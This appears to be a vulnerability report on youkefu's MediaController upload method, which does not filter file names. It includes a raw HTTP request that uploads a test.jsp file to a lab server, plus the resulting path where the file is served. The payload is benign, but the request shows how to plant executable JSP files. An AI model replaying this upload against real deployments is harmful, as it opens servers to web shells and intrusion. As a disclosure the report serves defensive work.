At line 138 of`\youkefu-master\src\main\java\com\ukefu\webim\web\handler\resource\MediaController.java `,There is an upload method, and after roughly reading the code, it was found that there are no restrictions or filtering processes on the file name inside the method. The file parameter imgFile received by this method conforms to javax.servlet.http.HttpServletRequest type.
![image](https://github.com/user-attachments/assets/94427c92-9d86-45de-a815-2759fb3b6eb3)

```
POST /res/image/upload.html HTTP/1.1
Host: 192.168.96.137:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101
Firefox/111.0
   Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,
*/*;q=0.8
   Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
   Content-Type: multipart/form-data;
boundary=---------------------------13001418927212618391481664692
   Content-Length: 226
   Origin: http://192.168.96.137:8088
   Connection: close
   Referer: http://192.168.96.137:8088/admin/config/index.html
   Cookie: SESSION=ced351be-b08e-443a-972d-17e17693f2a9
   Upgrade-Insecure-Requests: 1
   -----------------------------13001418927212618391481664692
   Content-Disposition: form-data; name="imgFile"; filename="test.jsp"
   Content-Type: text/html
   123456
   -----------------------------13001418927212618391481664692--
```

After the above request packet was sent, the access path of the file was returned
![image](https://github.com/user-attachments/assets/2667dc11-7474-4775-84c7-c984b8847914)

Search for the file name in the server where the application is located, such as "e10adc3949ba59abbe56e057f20f883e. JSP",
Found that the uploaded file has been written verbatim to the disk
![image](https://github.com/user-attachments/assets/5b9d133e-b7eb-400f-ad34-6295d744682c)
Accessible website：http://192.168.96.137:8088/res/image.html?id=upload/e10adc3949ba59abbe56e057f20f883e.jsp

If uploading a image ：
![image](https://github.com/user-attachments/assets/9be3c6c4-bcdd-420d-8b2e-89b54be37e3b)
